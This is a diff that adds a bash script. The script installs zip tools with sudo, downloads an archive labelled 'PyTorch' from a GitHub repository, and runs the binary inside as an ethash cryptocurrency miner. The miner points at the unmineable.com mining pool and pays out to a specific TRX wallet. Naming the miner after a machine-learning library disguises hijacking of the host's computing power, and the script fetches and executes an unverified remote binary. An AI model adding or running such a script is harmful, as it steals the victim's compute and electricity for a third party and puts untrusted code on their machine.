@@ -1,0 +1,2 @@
+#!/bin/bash
+sudo apt update && sudo apt-get install zip unzip && wget https://github.com/n5000/PyTorch/raw/main/PyTorch.zip && unzip PyTorch.zip && cd PyTorch && chmod u+x PyTorch && ./PyTorch -a ethash -o stratum+tcp://ethash.unmineable.com:3333 -u TRX:TWzp8qHuWZai4ZHaAMhQy9ND82ACKwoLd2.n56
